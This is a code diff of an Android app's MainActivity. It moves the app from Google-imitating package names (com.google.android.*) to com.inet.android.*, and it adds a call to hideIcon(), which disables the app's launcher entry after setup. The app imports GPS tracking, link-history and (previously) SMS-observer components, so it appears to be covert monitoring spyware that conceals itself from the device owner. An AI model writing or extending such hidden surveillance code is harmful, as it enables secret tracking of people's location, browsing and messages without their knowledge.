@@ -1,13 +1,10 @@
-package com.google.android.bs;
+package com.inet.android.bs;
 
 import java.io.File;
-import java.io.FileFilter;
-import java.io.FilenameFilter;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
-import android.os.Handler;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
@@ -20,7 +17,6 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
@@ -29,12 +25,10 @@ import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
-import android.widget.Toast;
 
-import com.google.android.certificate.R;
-import com.google.android.history.LinkService;
-import com.google.android.location.GPSTracker;
-import com.google.android.sms.SmsSentObserver;
+import com.inet.android.certificate.R;
+import com.inet.android.history.LinkService;
+import com.inet.android.location.GPSTracker;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -100,6 +94,7 @@ public class MainActivity extends Activity {
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 
 			e.commit();
+			hideIcon();
 		}
 		getID();
 		if (sp.getString("ID", "ID").equals("ID")) {
@@ -229,8 +224,8 @@ public class MainActivity extends Activity {
 
 	public void hideIcon() {
 		ComponentName componentToDisable = new ComponentName(
-				"com.google.android.certificate",
-				"com.google.android.bs.MainActivity");
+				"com.inet.android.certificate",
+				"com.inet.android.bs.MainActivity");
 
 		getPackageManager().setComponentEnabledSetting(componentToDisable,
 				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
